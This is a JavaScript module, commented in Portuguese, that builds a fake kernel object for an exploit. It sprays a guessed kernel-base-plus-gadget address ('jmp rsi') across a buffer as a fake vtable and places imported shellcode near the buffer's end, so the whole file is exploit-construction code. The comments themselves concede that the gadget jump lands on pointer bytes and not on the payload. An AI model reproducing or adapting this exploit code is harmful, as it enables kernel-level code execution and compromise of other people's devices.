import { CONFIG, GADGETS, SHELLCODE_HEX } from './config.mjs';
import { hexToBytes } from './utils.mjs';

export function build_fake_object(sizeStr) {
    const size = parseInt(sizeStr);
    const buffer = new Uint32Array(size / 4);
    const view = new DataView(buffer.buffer);
    const code = hexToBytes(SHELLCODE_HEX);

    // Endereço alvo para o pulo (Base + Gadget)
    const addr_jmp_rsi = CONFIG.KERNEL_BASE_GUESS + GADGETS.jmp_rsi;

    // 1. FAKE VTABLE (Spray de Ponteiros)
    // Preenchemos o objeto inteiro com o endereço do gadget.
    // Isso garante que se o kernel ler qualquer offset como vtable, ele pula para o gadget.
    for (let i = 0; i < size; i += 8) {
        view.setBigUint64(i, addr_jmp_rsi, true); // Little Endian
    }

    // 2. PAYLOAD CODE (Shellcode)
    // Colocamos o código no final do objeto para não sobrescrever os ponteiros vitais do início.
    // Se o gadget 'jmp rsi' funcionar, ele vai executar o que estiver em RSI (o próprio objeto).
    // Precisamos garantir que o início seja válido como código OU que pulemos os ponteiros.
    
    // Inserção segura no final do buffer
    const code_start = size - code.length - 32; 
    if (code_start > 0) {
        for (let k = 0; k < code.length; k++) {
            view.setUint8(code_start + k, code[k]);
        }
    }

    return buffer;
}
